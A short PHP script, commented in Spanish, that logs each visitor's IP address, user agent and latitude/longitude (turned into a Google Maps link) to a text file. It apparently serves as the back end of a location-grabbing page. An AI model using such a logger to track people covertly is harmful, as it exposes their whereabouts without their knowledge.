<?php
$date = date("d-m-Y H:i:s") . " (GMT)";
$ip = $_SERVER["REMOTE_ADDR"];
$lat = $_GET["lat"];
$long = $_GET["long"];
$url = "https://www.google.com/maps/search/?api=1&query=" . $lat . "%2C" . $long;
$agent = $_GET["agent"];
$data =  "Datetime: " . $date . "\nIP: " . $ip . "\nLocation: " . $url . "\nUser-Agent: " . $agent;

// Guarda los datos en un archivo
$file = fopen("docu.txt", "a");
if ($file) {
    fwrite($file, $data . "\n\n");
    fclose($file);
    echo "Datos guardados en docu.txt exitosamente.";
} else {
    echo "Error al abrir el archivo para escribir.";
}
?>
